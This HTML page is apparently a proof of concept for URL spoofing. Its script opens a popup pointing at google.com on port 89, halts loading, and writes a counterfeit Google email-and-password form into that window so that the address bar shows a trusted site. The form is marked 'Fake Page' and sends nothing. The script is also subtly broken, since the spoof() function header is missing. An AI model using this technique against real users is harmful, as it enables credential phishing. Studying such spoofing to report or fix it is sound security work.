<!DOCTYPE html>
<html>
<body>
<button onclick="spoof()">CLICK HERE HERE</button>

<script>

    let win = window.open("https://www.google.com:89", "https://www.google.com:89");

    if(!win) return alert("Please allow popups");

    // 2) early stop to freeze navigation
    setTimeout(() => {
        try { win.stop(); } catch(e){}
    }, 10000);

    // 3) inject fake UI
    setTimeout(() => {
        try{
            win.document.open();
            win.document.write(`
                <div style="margin-top:80px;text-align:center;font-family:-apple-system;">
                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" width="180">

                    <input placeholder="Email" style="width:260px;height:32px;font-size:16px;"><br><br>
                    <input type="password" placeholder="Password" style="width:260px;height:32px;font-size:16px;"><br><br>
                    <button style="width:100px;height:36px;font-size:16px;">Next</button>
                    <p style="color:red;margin-top:12px;">Fake Page</p>
                </div>
            `);
            win.document.close();
        }catch(e){}
    }, 10);

    // 4) minor URL enforcement
    setTimeout(()=>{
        try{ win.location.href = "https://www.google.com:89"; }catch(e){}
    }, 10);

}
</script>
